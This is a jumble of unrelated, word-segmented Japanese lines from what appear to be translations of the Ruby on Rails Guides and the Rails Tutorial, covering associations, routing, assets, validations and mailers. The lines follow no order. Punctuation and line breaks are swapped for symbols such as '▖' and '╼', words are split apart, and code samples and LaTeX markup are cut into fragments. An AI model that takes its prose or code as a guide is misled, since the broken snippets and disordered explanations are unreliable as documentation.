しかし 例外 が 重要 な もの で あ る こと も 確か な の で 、 \ ref{ sec : comments_ for_ various _readers } で 推薦 し た Ruby 本 で 例外 に つ い て 詳し く 学 ぶ こと を お すすめ し ま す
` has_many ` 関連 付け を 宣言 し た クラス で は 、 以下 の 16 の メソッド を 自動 的 に 利用 でき る よう に な り ま す 。
サイト レイアウト の リンク を 変更 する 方法 の ひと つ と し て 考え られ る の は 、 ERB コード の 中 で if -else を 使用 し 、 条件 に 応 じ て リンク を 表示 し 分け る こと で す 。
" dude " ▖ pluralize ( 0 )   # => " dudes "
開発 中 に \ href { http://en ▖wikipedia ▖org/wiki / SNAFU } { 袋小路 } に 迷い込 ん で しま っ た 場合 で も 、 これ ら の 機能 を 使 え ば 元 の 状態 を 復元 でき ま す 。
Java Script アセット に `erb ` 拡張 子 を 追加 する と   ( `application ▖js▖erb ` など ) 、 以下 の よう に Java Script コード 内 で ` asset_path ` ヘルパー を 使用 でき ま す 。
現状 の 認証 テスト で は 、 ユーザー が サイン イン する と   [ Profile ]   や   [ Settings ]   など の リンク は 表示 さ れ る こと を チェック し て い ま す 。
いつ も と 同様 に 、 今度 の テスト は 赤色   ( 失敗 )   に な る はず で す 。
* ` params [ :_ method ] ` が 存在 する とき に 、 ( HTTP の ) メソッド を 上書 き ま す 。
この メソッド の 呼び出し は 、 エンジン の コントローラ / モデル / ルーティング など が 持 つ 固有 の 名前 空間 を 、 アプリケーション 内部 の コンポーネント が 持 つ 類似 の 名前 空間 から 分離 する 役目 を 担 い ま す 。
User モデル の \ kode { name } 属性 を 設定 する 、 ラベル 付き テキスト フィールド 要素 を 作成 する の に 必要 な HTML を 作成 し ま す
これ を 行な う に は 、 適切 な ルーティング を 生成 でき る ディレクトリ を Rails に 指示 する 必要 が あ り ま す 。
しかし 、 私 たち の サンプル アプリケーション の 実装 に は まだ 足り な い もの が あ り ま す ▟ それ が 何 な の か 、 次 の 節 に 進 む 前 に 考え て み て くださ い
= > { " last_ name " = > " Hartl " ,   " first _ name " = > " Michael " }
self を 省略 し た 結果 を リスト \ ref{ code :find_authenticate_user } に 示 し ま す 。
" foo\n \nbar " ▖indent ( 2 )              # => "    foo\n \n    bar "
run  Rails ▖ application
       create      app/views/users
アプリケーション が MultiJSON に 直接 依存 し て い る 場合 、 以下 の よう な 対応 方法 が あ り ま す 。
####  password _field
setup   do
次 に 個別 の \emph { シナリオ } を 追加 し ま す 。
before フィルター の コメント アウト を 元 に 戻 し て 、  \ passing \   に な る か どう か 確かめ て み ま しょ う   ( リスト \ ref{ code :uncommented_before_filter } ) 。
###  Action   Mailer の ビュー で URL を 生成 する
ソース に ` : all ` を 指定 する と 、 stylesheet ディレクトリ に あ る すべて の スタイル シート を 含め る こと が でき ま す 。
これ ら の メソッド の 使用 に は 注意 が 必要 で す 。
ren der  plain:  " OK "
マイクロ ポスト 作成 フォーム の あ る ホーム 画面 の モックアップ
生成 さ れ た Application メイラー
A ▖ x   =   1
しかも 、 第 3 章 で は 一 度 も \ kode {StaticPages Controller ▖ new } を 実行 し ま せ ん で し た 。
これ に よ り 、 モデル の インスタンス を URL と し て 扱 う こと が でき ま す ▟ これ は リソース フル な スタイル を 採用 する 大きな メリット の 1 つ で す 。
config ▖ assets▖ compress =  true
\ href { http://railscasts▖ com/}{ RailsCasts} (Ryan   Bates)   :   極めて 質 の 高 い   ( ほぼ )   無料 の スクリーン キャスト で す 。
` last ! ` メソッド の 動作 は 、 マッチ する レコード が 見つか ら な い 場合 に ` ActiveRecord : : Record NotFound ` 例外 が 発生 する 点 を 除 い て 、 ` last ` メソッド と まったく 同じ で す 。
Rails に は 豊富 な ページ ネーション メソッド が あ り ま す ▟ 今回 は その 中 で 最も シンプル かつ 堅牢 な \ href { http://wiki ▖ github▖ com/mis lav/will _ paginate/}{ will _ paginate } メソッド を 使用 し て み ま しょ う 。
#  Use   debugger
   constraints  subdomain:  ' admin '  do
  #< Client   id :   221 ,   first _ name :  " Russel " >
ページ の タイトル が どれ も ほぼ 同じ   ( 完全 に で は な い が ) 。
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Request ` の 導入 に 伴 い ` Action Controller : : AbstractRequest ` が 非 推奨 と な り ま し た 。
#   与え られ た ユーザー が フォロー し て い る ユーザー 達 の マイクロ ポスト を 返 す 。
*  `distinct `
この 変更 に よ り リスト \ ref{ code : name_presence_ test } の テスト は   \ passing   し て い る はず で す 。
routes▖rb                    #  NO
#    Person ▖exists ? ( '
*   レイアウト を ネスト する 方法   ( サブ テンプレート )
[ Users ]   リンク 用 の URL 。
安全 で な い クエリ 生成
既に 、 管理 者 のみ が ユーザー を 削除 でき る よう に 構成 済み で す ▟ 削除 リンク は 管理 者 に しか 表示 さ れ ま せ ん 。
最初 に \ kode { name } 属性 の 存在 を 確認 する テスト を 行 い ま しょ う 。
`:builder ` オブション を 使用 する こと で 、 独自 の ビルダ を 構成 でき ま す 。
= >  Action Controller : : Metal
Web フォーム に Ajax を 採用 する の は 今 や 当たり前 に な り つつ あ る の で 、 Rails で も Ajax を 簡単 に 実装 でき る よう に な っ て い ま す 。
エンジン を 生成 する
以下 の 例 で 示 し ま す 。
 *  available  in this   directory   and  any  sub - directories▖
HTTP / 1 ▖ 1   200   OK
( 指摘 し て くれ た Katarzyna   Siwek に 感謝 し ま す ▟ )
#### image_ path
###  NOT 条件
従来 の ネットワーク トラフィック は 西欧 文化 圏 の アルファベット が ほとんど で し た が 、 それ 以外 の 言語 を 伝え る ため に Unicode など の 新し い エンコード 方式 が 使用 さ れ る よう に な っ て き ま し た 。
def  some_method
この ブランチ の 名前 は ローカル コンピュータ の 自分 の リポジトリ 上 で しか 使 わ れ な い の で 、 どんな 名前 で も 構 い ま せ ん 。
上 に よ っ て 以下 が 出力 さ れ ま す 。
    flash▖now [ : alert]  =  " Your  book   was   not   found "
この よう に 作成 さ れ た コメント に は 、 スペース 2 文字 分 の インデント が 与え られ ま す 。
この メソッド は 、 モデル で ` default _scope ` が 指定 さ れ て い る が 、 それ を 適用 し た く な い クエリ が あ る 場合 に 特 に 便利 で す 。
*  ` Rails : : Rack : : Logger ` は 、 リクエスト が 開始 さ れ た こと を ログ に 通知 し ま す 。
bun dler_stubs/
#   </object >
上 の 例 で も わか る よう に 、 フォーマット に ` : db ` を 指定 する と SQL の ` BETWEEN ` 句 が 生成 さ れ ま す 。
# => [ [ " 1 " ,   " 2 " ,   " 3 " ] ,  [ " 4 " ,   " 5 " ,   " 0 " ] ,  [ " 6 " ,   " 7 " ,   " 0 " ] ]
この 警告 は \ ref{ sec : professional_grade_deployment } で 解決 する 予定 で す ) 。
デフォルト の エラー メッセージ は  _ " must   be blank" _  で す 。
te}╼╼    %  subsection  requiring_ the_right _user   ( end ) ╼╼    \ subsection { フレンド リー フォワーディング } %  ( fold) ╼    \ label{ sec : friendly _ forwarding } ╼╼
╼╼    %  subsection   the_asset_pipeline   ( end ) ╼╼    \ subsection { 素晴らし い 構文 を 備え た スタイル シート } %  ( fold) ╼    \ label{ sec : sass}╼╼
ユーザー の 認証 は 、 パスワード の 送信 、 暗号 化 、 データベース 内 の 暗号 化 さ れ た 値 と の 比較 と い う 手順 を 踏 み ま す 。
" 2013 - 0 3 - 1 1   0 1 : 0 5 : 24 " ,   updated_at:   " 2013 - 0 3 - 1 1   0 1 : 0 5 : 24 " >
invoke     css
Ruby を 勉強 し た こと の あ る 方 で あ れ ば 、 Rails は ブロック の 内容 を \emph{yield } し て い る と 推測 する こと で しょ う ▟ そして 、 その 推測 は おそらく 正し い で しょ う 。
スクリーン キャスト   ( 英語 )   は  \ href { http://www ▖railstutorial ▖org / }{ Ruby   on   Rails チュートリアル Web サイト } ( 英語 版 ) で 購入 でき ま す 。
person   =   Person ▖ new ( name :  " JD " )
     params ▖ require(:article ) ▖ permit(:title ,  : text )
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/duplicable▖ rb ` で す 。
# => {: a=>{: b = > 1 ,  : c = > 2 } }
( Rails   4 は Ruby   1 ▖ 8 ▖ 7 で は 動作 し ま せ ん ) 。
#### ` alias_attribute `
ウェブ 開発
逆 に 無名 モジュール は 、 定義 上 必ず 到達 不能 に な り ま す 。
\ kode {user ▖ remember } メソッド が 動作 する よう に な っ た の で 、 ユーザー の 暗号 化 済み ID と 記憶 トークン を ブラウザ の 永続 cookies に 保存 し て 、 永続 セッション を 作成 する 準備 が でき ま し た 。
{ 0 } 表 3 ▖ 2 { / 0 }   { 1 } サンプル アプリケーション の   ( ほぼ )   静的 な ページ ▟ { / 1 }
文字 列 の 切り詰め で は 、 省略 文字 列 の 長 さ も 加味 さ れ る こと に 特 に ご 注意 くださ い 。
< form   accept - charset = " UTF - 8 "   action = "/articles "   class = " new_ article "   data - remote= " true "   id= " new_ article "   method= " post " >
      t ▖integer  : part _ id
*   X - Content- Type - Options
= >   [ 8 ,   17 ,   42 ]
{ 0 } クラス 2 ▖ 17 { / 0 } ╼╼ { 1 } \ kode { Application Controller } クラス に おけ る 継承   { 3 } { / 3 }   { 4 } app/controllers/application_controller▖ rb { / 4 } { / 1 }
COM A_US - ER@f▖b ▖org   frst ▖ lst @ foo▖ jp  a +b @baz▖ cn ]
結果 を 見 る ため に 、 もう 一 度 テスト を 実行 し て み ま しょ う 。
Steve は 、 5 % から 20 % も の リクエスト が キャッシュ さ れ て い な い こと に 気付 き ま し た 。
###  記事 を 更新 する
= > [ " a " ,  " b " ,  " c " ]
|  HTTP 動詞   |   パス              |  コントローラ # アクション   |   目的                                      |
` secrets▖ secret_key_ base ` メソッド は 、 改竄 防止 の ため に 、 アプリケーション の セッション を 既知 の 秘密 キー と 照合 する ため の キー を 指定 する とき に 使 い ま す 。
デフォルト の エラー メッセージ は  _ " must   be  odd" _  で す 。
\ kode { users } テーブル に \ kode { password_digest } カラム を 追加 する マイグレーション
今回 の 場合 、 すべて の navbar クラス に は 、 \ ref{ sec : custom_css } で イン ストール する Bootstrap フレームワーク に よ っ て 特別 な 意味 が 与え られ ま す 。
メソッド を 組み込 み クラス に 追加 でき る 柔軟 性 の 高 さ の おかげ で 、 純粋 な Ruby を 極めて 自然 に 拡張 する こと が でき ま す   ( もちろん 注意 し て 使 う 必要 は あ り ま す が ) 。
これ に よ り 、 ` app/views/comments/_ comment▖html ▖erb ` パーシャル が 、 `@ article ▖ comments ` コレクション に 含 ま れ て い る コメント を すべて 出力 する よう に な り ま し た 。
幸い 、 解決 策 の 実装 は 簡単 で す ▟ 実 は 、 この 問題 は データベース レベル で も 一意 性 を 強制 する だけ で 解決 し ま す 。
\ kode { form _ for } ヘルパー は 、 Active   Record の オブジェクト に 対応 し た フォーム を 生成 する
*   アフター イニシャライザ
これ ら の メソッド の いずれ か を 使用 し て HTTP リクエスト を 直接 発行 する と 、 低 レベル の \ kode { response } オブジェクト に アクセス でき る よう に な り ま す 。
この よう な 場合 、 これ ら の アセット を 明示 的 に プリ コンパイル する 必要 が あ り ま す 。
Rails アプリケーション で Active   Record の 関連 付け を 効率 的 に 使用 する ため に は 、 以下 に つ い て 知 っ て お く 必要 が あ り ま す 。
これ ら の メソッド は 使 う と 、 紐付 い て い る ユーザー を \emph { 通 し て } マイクロ ポスト を 作成 する こと が でき ま す   ( 慣習 的 に 正し い 方法 で す ) 。
TIP:   ルーティング の 詳細 に つ い て は [ Rails の ルーティング ] ( routing ▖ html ) を 参照 し て くださ い 。
/ users/new
これ は リスト \ ref{ code : current_user } で 使用 さ れ て い ま し た 。
新規 レコード を 作成 し て 保存 する と 、 SQL の ` INSERT ` 操作 が データベース に 送信 さ れ ま す 。
\ kode {Users Controller } クラス に おけ る 継承
< li > `: smtp ` ( default )  -- `config▖ action _mailer ▖ smtp_settings ` で 設定 可能 ▟</ li >
   Loading   test   environment
DateTime▖ new ( 158 2 ,   10 ,   4 ,   23 )   +   1 ▖ hour
最も 簡単 な 方法 は 、 Rake の \ kode { db : migrate : reset } タスク を 実行 し て データベース を リセット する こと で す 。
      if @bu siness
< Location  /assets/>
WARNING :   他 の クラス の ` has_many`   関連 付け と つながり の あ る   ` belongs_to `   関連 付け に 対 し て この オプション を 使用 し て は いけ ま せ ん 。
上 の ファイル は マニフェスト 内 で 以下 の よう に 参照 さ れ ま す 。
# =>  Strip  these tags !
$ bun dle   exec   rake   test ╼ 3   tests ,   2   assertions ,   0   failures ,   1  errors ,   0   skips
#   active_ record / model_schema▖ rb
リスト \ ref{ code :errors_ partial } の とき
$  bin/rails   generate mailer  User Mailer
特に 、 以下 の Ruby コード は 、
これ は 、 メイラー ごと に ` from ` や ` reply_ to ` など を 設定 し ま す 。
これ ら を すべて 行な う に は 、 ` author_ name ` 用 の ` attr_accessor ` と 、 author と の 関連 付け 、 および ` before_ save ` 呼び出し を ` app/models/blorgh/article ▖ rb ` に 追加 する 必要 が あ り ま す 。
[ ブラウザ から サイト へ の 接続 を セキュア な もの に 限 っ て 許可 する か どう か を 指定 し ま す ] ( http://ja▖wikipedia ▖org/wiki/ HTTP _ Strict_ Transport_ Security )
` : plain` 、 `: login ` 、 `: cram _md 5 ` の いずれ か の シンボル を 指定 でき ま す 。
ここ で いつ も の よう に 、 マイグレーション を 実行 し て \ kode { admin } 属性 を 追加 し ま しょ う ▟ コマンドライン で 、 この 属性 の 型 を \ kode {boolean } と 指定 し ま す 。
Linux や OS   X など の Unix 系 システム は 、 ユーザー タスク や システム タスク は \emph { プロセス   ( process ) }   と 呼 ば れ る 一種 の コンテナ の 内部 で 実行 さ れ ま す 。
#=> <p ><code >: to_ param </ code ></p>
  \ section { 最後 に } %  ( fold) ╼  \ label{ sec : advanced _ login_conclusion}╼╼
以下 の 変更 は 、 アプリケーション を Rails   4 ▖ 0 に アップグレード する ため の もの で す 。
この 機能 を オフ に し て I 18 n で すべて の 種類 の ロケール オプション を 使用 でき る よう に する に は 、 以下 の よう に 変更 し ま す 。
  — Bob   Cavezza   ( \emph { Rails   チュートリアル } 読者 )
ここ で 、 users _ path に POST リクエスト を 送信 する ため に 、 \ kode { post _via_redirect } と い う メソッド を 使 っ て い る こと に 注目 し て くださ い 。
論理 値 は 、 特に \emph { 処理 の 流れ を 変更 する } とき に 有用 で す 。
*   ジョブ の 作成 方法
経験 則 と し て 、 ` SomeClass ` と い う クラス が あ れ ば 、 ` active_ support/core _ext/some_class ` と い う パス を 指定 する こと で 一 度 に 読み込め ま す 。
|                     |   206                | : partial_content                 |
Ruby   on   Rails で バグ を 見つけ た ら 、 そこ から 貢献 を 開始 でき ま す 。
他 に も 、 Active   Record インスタンス に 機能 を 追加 する カラム 名 が いく つ か あ り ま す 。
指定 でき る 値 は `: cookie_store ` ( デフォルト ) 、 `: mem_cache_store ` 、 `: disabled ` で す 。
この 記法 を 毎回 繰り返 す の は 煩雑 な の で 、 たとえば ` create ` アクション と ` update ` アクション で 共用 でき る よう に この メソッド を くくりだ し て お く の が 普通 で す 。
Ruby   on   Rails   3 ▖ 2   チュートリアル
受信 者 の メール アドレス を メール に その まま 表示 する の で は な く 、 受信 者 の 名前 で 表示 し た い こと が あ り ま す 。
第 \ ref { cha : log _ in_log _out } 章 で は 、 \ ref{ sec : adding _a_secure_ password } の 認証 システム を 利用 し て 、 ユーザー が 実際 に Web サイト に ログ イン でき る よう に し ま す 。
特定 の 属性 に アクセス する ため の 、 種類 が " text " の input タグ を 返 し ま す 。
`nil ` で な い 場合 に のみ オブジェクト の メソッド を 呼び出 し た い 場合 、 最も 単純 な 方法 は 条件 文 を 追加 する こと で す が 、 どこ か 冗長 に な っ て しま い ま す 。
xml ▖target ( " name "  => " compile " ,   " option "  =>  " fast " )
独自 の バリデーション を 定義 する ため に 、 今 まで 使 っ て い た \ kode { validates } メソッド で は な く 、 \ kode { validate } メソッド を 使 っ て い る 点 に 注目 し て くださ い 。
####  SQLite 3 データベース を 設定 する
中継 点   ( コミット の 直前 など )   に 到達 し たら 、   コマンドライン で \ kode {rspec   spec/} を 実行 し て テスト スイート を すべて 実行 し 、 成功 する こと を 確認 する 。
Category ▖ includes( articles : [{  comments: : guest  }, : tags] ) ▖find ( 1 )
アクション は 定義 さ れ ま し た が 、 これ に 関連 付け られ た ビュー が な い の で エラー が 表示 さ れ ま す 。
    else
プッシュ し た Rails アプリケーション の リポジトリ を 開 い て   ( ここ で は https://github▖ com/ your -user - name/rails   に あ る と し ま す ) 、 右 ペイン に あ る   [ Pull   Requests ]   を クリック し ま す 。
|                     |   205                | : reset_content                   |
特殊 な こと を する の で な けれ ば 、 これ ら の 予約 済み カラム 名 の 使用 は 避け て くださ い 。
* ` limit `
    name   varchar ( 25 5 ) ,
production :
マイグレーション の 後 で たま に Rake タスク が 実行 でき な く な る こと が あ り 、 多く の 人 が これ に 戸惑 い ま す 。
古 い バージョン の Rails から アップグレード する
最も よく 使用 さ れ る 名前 空間 と い え ば 、 多数 の 管理 用 コントローラ 群 を まとめ る ` Admin : : ` 名前 空間 で しょ う 。
ユーザー 一覧 ページ に ユーザー が 1人 しか 表示 さ れ て い な い
( リスト \ ref{ code : sign_in_password _ resets } と 図 \ ref { fig : forgot_ password _ link } 参照 )
Active   Record は 、 テーブル に 定義 さ れ た すべて の フィールド   ( 属性 と も 呼 ば れ ま す )   に 対 し て 自動 的 に ファイン ダ メソッド を 提供 し ま す 。
つまり 、 以下 の よう な テスト は
` : prefix ` オプション を true に する と 、 生成 さ れ た メソッド の 名前 に プレフィックス を 追加 し ま す 。
#   この よう な 処理 を 数千 件 も の レコード に 対 し て 実行 する と 、 効率 が 大幅 に 低下 し ま す 。
TIP:   ルーティング の 詳細 に つ い て は [ Rails の ルーティング ] ( routing ▖ html ) を 参照 し て くださ い 。
将来 、 ユーザー 定義 の タイム ゾーン が システム の タイム ゾーン と 比較 さ れ る こと が あ り え ま す ▟ システム の タイム ゾーン で は デフォルト で ` Date▖ today ` が 使用 さ れ ま す 。
@account  = @ supplier ▖ account
resources  : comments ,  only:  [ : show ,  : edit ,   : update ,  : destroy ]
Client▖select(:id ) ▖ map ( &: id )
    has_and _belongs_to_many  : assemblies , -> { group   " factory "   }
- - no- test - framework
デフォルト で は 、 すべて の ヘルパー は ビュー で 使用 でき ま す が 、 コントローラ で は 使用 可能 に な っ て い ま せ ん 。
TIP:   この メソッド で 取り出 さ れ る レコード は 、 使用 する データベース エンジン に よ っ て も 異な る こと が あ り ま す 。
name  LIKE   ? ', " %#{query }%" ] )
作成 し た コード を リスト \ ref{ code : dependent_destroy_ test } に 示 し ま す
distance _ of_time_in_words ( Time▖now ,   Time▖now   +   15 ▖ seconds ,  include_seconds :  true )   # =>  less than   20   second s
#### ` descendants`
解決 法 は いたって 単純 で す ▟ 1 つ の コード 実行 パス 内 で は 、 ` ren der ` メソッド や ` redirect ` メソッド の 実行 は 1 度 だけ に し て くださ い 。
すなわち 、 有効 な 情報 を 送信 し て 、 ユーザー が \emph { 作成 さ れ た } こと を 確認 し ま す 。
Rakefile
   include  Blorgh : : Concerns : : Models : : Article
` has_many ` 関連 付け が 使用 さ れ て い る 場合 、 「 反対 側 」 の モデル で は ` belongs_to ` が 使用 さ れ る こと が 多 く あ り ま す 。
上 の 文字 列 は 、 パスワード   ( \kode { " foobar " } )   を 暗号 化 し た もの で あ り 、 ユーザー オブジェクト を 初期 化 する の に 使用 さ れ ま し た 。
# <User   id :   2 ,   name :  " A   Nother " ,  email :   " another @ example ▖org " ,   created_at :
優先 さ れ る 値 は 、 同じ ハッシュ が 与え られ た 場合 で あ っ て も 一定 する 保証 は あ り ま せ ん 。
\ kode { String } クラス の 継承 階層
Rails は 出力 す べ き ビュー を 探索 する 際 に 、 アプリケーション の ` app/views ` ディレクトリ を 最初 に 探索 し ま す 。
この 変更 は 、 ルーティング ファイル の \ kode { resources } 行 で 行 い ま す   ( リスト \ ref{ code : account_activations _ route } ) 。
Rails   4 ▖ 1 の ` ren der ` に `: plain` 、 `:html` 、 `: body ` オプション が 導入 さ れ ま し た 。
   belongs_to  : customer
“ following ”   関連 の メソッド を テスト する  
      invoke   jbuilder_ scaffold_controller
####  ミドルウェア を 追加 する
独自 の SQL を 使用 し て レコード を 検索 し た い 場合 、 ` find_ by _sql ` メソッド を 使用 でき ま す 。
\ kode {Spork ▖ prefork } ブロック へ の 環境 読み込み を 追加 する 。
他 の 多く の 言語 に よ る Web アプリケーション フレームワーク と 比較 し て 、 アプリケーション を 作成 する 際 の コード 量 が より 少な く て 済 む に も かかわ ら ず 、 より 多く の 機能 を 実現 でき ま す 。
*   `update_counters`
トピック ブランチ を 分け て お く こと で 、 チュートリアル 本編 と の 食い違い を 避け る こと が でき ま す 。
最初 に 、 モデル の 継承 構造 に つ い て 説明 し ま す 。
{ nil  => nil ,   1   = >   1 ,   nested : {a :   3 ,   5   = >   5 } } ▖ deep _transform _keys { |key|  key▖ to_s ▖upcase   }
ネスト し た レイアウト   ( サブ テンプレート と 呼 ば れ る こと も あ り ま す )   を 使用 する こと で 、 メイン の レイアウト を 複製 し て 編集 し たり せ ず に これ を 実現 でき ま す 。
Home ページ に footer を 追加 する
*   引数 を 2 つ 使用 する ` asset -url ` は 非 推奨 と な り ま し た 。
|   POST       | / kategorien                 |  categories# create  |  categories_ path         |
* `: maximum `  -   属性 は この 値 より 大きな 値 を 取れ ま せ ん 。
#   active_ support/dependencies▖rb
これ ら の 課題 を 達成 する に は 、 もう 少し 新し い テスト の テクニック を 覚え る 必要 が あ り ま す が 、 それ に よ り テスト スイート が 一段 と 強力 に な り ま す 。
|                     |   102                | : processing                        |
たとえば 、 ` asset -url( " rails ▖ png " ,  image ) ` は ` asset -url( " rails ▖ png " ) ` と する 必要 が あ り ま す 。
| --------- | -------------- | ----------------- | --------------------------------------------- |
複数 の フィールド を 指定 し て 並べ る こと も でき ま す 。
<%=  image_tag   " header▖ png "   %>
JSON   gem  API は 今後 正常 に 動作 し ま す が 、 その 代わり JSON   gem  API から Rails 特有 の 機能 に アクセス する こと は でき な く な り ま す 。
PATCH
$ bun dle   exec   rake   test : sqlite 3
array      # =>  ['string ' ]
BigDecimal ▖ new ( 5 ▖ 0 0 ,   6 ) ▖ to _ formatted_s ( " e " )   # =>  " 0 ▖ 5 E 1 "
def  destroy
同様 に 、 2 つ 目 の 代入 「 \ texttt{@ foo  || " baz " } 」 ( \ texttt { " bar "  || " baz " } など )   の 評価 値 は \ texttt { " bar " } に な り ま す 。
category ▖ articles ▖published # =>  [ この カテゴリ に 属 する 、 公開 済み の 記事 ]
たとえば 、 ` I 18n ▖ locale  = : de ` と 設定 し 、 ` public /500 ▖ de ▖html ` と ` public /404 ▖ de ▖html ` を 作成 する こと で 、 ローカライズ 版 の レスキュー ページ を 作成 でき ま す 。
論文 の 正式 な タイトル :   Fielding ,   Roy  Thomas ▖
*   Rails アプリケーション の 原型 を 素早 く 立ち上げ る 方法
###  sprockets- rails
これ は 特に production 環境 で 有用 で す ▟ データベース 接続 の パスワード の よう な 秘密 情報 を Git など の ソース コントロール に 直接 登録 する こと は 避け な けれ ば な ら な い から で す 。
スニペット の マーク アップ が 複雑 に な る よう で あ れ ば 、 早め に テンプレート ファイル に 移行 する こと を ご 検討 くださ い 。
リスト \ ref{ code :email_downcase } で は 、 次 の よう に 代入 を し て い ま し た が 、
static - pages
###  リレーション に 対 する ミューテーター メソッド 呼び出し
この 補助 ファイル は 標準 の 一時 ファイル 用 ディレクトリ に 書き込 ま れ ま す が 、 2 番 目 の 引数 で ディレクトリ を 直接 指定 する こと も でき ま す 。
そして 上 の 方法 ( に お け る 英語 の 記述 ) は 、 Rails で 関連 付け を 宣言 する ため に 使用 さ れ る 文法 と 非常 に 似 て い ま す 。
  $  subl  ▖
この メソッド は 、 フル パス の   ( qualified )   テーブル 名 も 扱え ま す 。
これ は リスト \ ref{ code : generate_micropost _model } で 使用 さ れ て い ま し た 。
class   Assembly <  ActiveRecord : : Base
上 の コード で は 、 ユーザー 登録 後 に サイン イン し て い る こと を 確認 する ため に 、 サイン アウト 用 の リンク が 表示 さ れ て い る か どう か を テスト し て い ま す 。
     delivery _ options  = { user_ name :  company▖ smtp _user ,
" Backoffice : :Users Controller " ▖ deconstantize    # =>  " Backoffice "
" 2010 - 0 7 - 27   23 : 37 : 0 0 " ▖ to_time     # =>  Tue   Jul  27   23 : 37 : 0 0   UTC  2010
*  ` decrement_counter `
{ 0 } 図 11 ▖ 15 { / 0 }   { 1 } 新し い マイクロ ポスト を 作成 し た 直後 の Home ページ { / 1 }
これ は 、 ` config▖ action_controller▖ session_store ` に 値 が 設定 さ れ て い る 場合 に のみ 有効 で す 。
で は 最初 に 、 いつ も の よう に \ kode {updating - users } トピック ブランチ を 作成 し ま しょ う 。
Rails ヘルパー は これ を 使用 し て 、 マッピング リクエスト が Sprockets へ 戻 さ れ る こと を 回避 し ま す 。
以前 の Rails で は 、 ビルト イン の ヘルパー に リンク さ れ て い る すべて の アセット に 日付 ベース の クエリ 文字 列 を 追加 する と い う 戦略 が 使用 さ れ て い ま し た 。
Heroku は 、 ソース コード の バージョン 管理 に Git を 使用 し て い れ ば 、 Rails アプリケーション を 簡単 に 本番 環境 に デプロイ でき ま す
SELECT   articles ▖
    has _one   : account
` config/ database▖yml ` ファイル の 内容 が 空 で 、 かつ 環境 変数 ` ENV [ ' DATABASE _ URL '] ` が 設定 さ れ て い る 場合 、 データベース へ の 接続 に は 環境 変数 が 使用 さ れ ま す 。
\ begin {equation}╼\ label{ eq:time_ comparison }╼t_r < t_e▖
そして いずれ か の バリデーション が 失敗 する と 、 `errors ` コレクション に 再び メッセージ が 格納 さ れ ま す 。
セレクタ 要素 （ つまり タグ ） は 以下 の よう に 指定 し ま す 。
もちろん 、 いずれ デフォルト の Rails ページ は 不要 に な り ま す が 、 アプリケーション が 動 い て い る の を 見 る の は 気分 の い い もの で す 。
特に XSS の 場合 、 _ ブラック リスト で は な く ホワイト リスト に 基づ い た 入力 フィルタ を 実施 する こと が 絶対 重要 で す _ 。
{ " development " =>{ " adapter " = > " postgresql " ,   " host " => " local host " ,   " database " = > " my_ database " } }
###  フィンガー プリント と 注意 点
</ul > 詳細 に つ い て は [ API ドキュメント ] ( http://api▖ rubyonrails ▖org / classes / Action Mailer/Base ▖html ) を 参照 。
Rails 関連 の 書籍 を 読 ん で い る と   “ REST ”   と い う 略語 を よく 見かけ ま す ▟ これ は REpresentational   State   Transfer の 略 で す 。
@assembly_ ids  = @ part ▖ assembly_ ids
それ で は 、 コンソール で 文字 列 に つ い て 調べ て み ま しょ う ▟ 今回 は \ kode {rails  console } の 代わり に 、 短縮 版 の \ kode {rails   c } で コンソール を 起動 し ま す 。
これ は 、 HTTP 標準 で は 技術 的 に リダイレクト 後 に 完全 な URL が 要求 さ れ る ため で す ▟ ただし 、 ほとんど の ブラウザ で は どちら の 方法 で も 動作 し ま す 。
has_and _belongs_to_many 関連 付け の 図 ] ( images/habtm▖png )
( Proc や Ruby の トピック と し て は やや 高度 な 部類 に 含 ま れ る の で 、 今 すぐ わか ら な く て も 心配 する 必要 は あ り ま せ ん ▟ )
以下 の 例 で 考察 し て み ま しょ う 。
      invoke        test _unit
now ▖all _week(:sunday )
####  My SQL データベース を 設定 する
以下 の 例 を 参照 くださ い 。
サンプル アプリケーション の レイアウト
つまり 、 ここ で は 以下 を その まま 使 え ば よ い だけ な の で す 。
class   Product  <  ActiveRecord : : Base
╼ ╼ This   is   the   first   application   for   the╼ [ * Ruby   on   Rails   Tutorial * ] (http://www ▖railstutorial ▖org/ ) ╼ by   [ Michael   Hartl ] ( http://www ▖michaelhartl▖ com/) ▖
それ から 、 Ajax リクエスト を 受信 し た とき に \ kode { create } アクション と \ kode { destroy } アクション が 正常 に 動作 する こと を 確認 し ま す
ide   the  IDE  itself ▖) ╼╼    \ subsection { ユーザー ページ を 探検 する } %  ( fold) ╼    \ label{ sec :a_user_ tour}╼╼
ワイルド カード セグメント は ルーティング の どの 部分 で も 使用 でき ま す 。
| vendor/ | サード パーティ に よ っ て 書 か れ た コード は すべて ここ に 置 き ま す 。
さらに 、 現在 形 かつ 命令 形 で 書 い て お け ば 、 Git コマンド 自身 に よ っ て 生成 さ れ る コミット メッセージ と も 時制 が 整合 し ま す 。
連鎖 し た モジュール は 、 階層 の 下 から 上 の 順 に 配列 と し て 返さ れ ま す 。
class  Employee  <  ActiveRecord : : Base
TIP:   コミット が 複数 に わた っ て い る 場合 は 、 必ず   1   つ の コミット に スカッシュ ( squash ) し て お い て くださ い 。
Rails は その よう な 場合 に は 例外 を 再 発生 さ せ な けれ ば な り ま せ ん 。
わか り に くさ の 原因 の 一部 は この 点 に あ り ま す ) 。
デフォルト は `' -'` で 、 `<%= -%>` また は `<%= =%>` の 場合 に 末尾 スペース を 削除 し て 改行 し ま す 。
Rails で は 以下 の 6 つ の アセット タグ ヘルパー が 利用 でき ま す 。
理想 と する 最終 的 な プロファイル ページ の モックアップ
#   1 回 あたり add_ invoices に 納品 書 1000 通 の 配列 を 渡 す
メール を 配信 直前 に 加工 する
    has_many  : orders ,   dependent :  : destroy
id = { 0 } 1 { / 0 } の ユーザー を 検索 でき た の は 以上 の 仕組み に よ る もの で す   ( リスト { p 1 } ) 。
  <strong > Commenter : </strong >
条件 を ハッシュ で 渡 す 場合 、 ハッシュ の キー に は 条件 付け し た い フィールド を 、 ハッシュ の 値 に は その フィールド を どの よう に 条件 づけ する か を 、 それぞれ 指定 し ま す 。
この 定義 は 、 動的 セグメント と し て 指定 し て い な い パラメータ に 対 し て も 適用 さ れ ま す 。
これ は リスト \ ref{ code : custom_about_ page } で 使用 さ れ て い ま し た 。
--------------------------------------------
しかし 索引 の あ る 本 で あ れ ば 、 “ foobar ” を 含 む すべて の ページ を 索引 の 中 から 探 す だけ で 済 み ま す 。
###  Active   Record を 設定 する 。
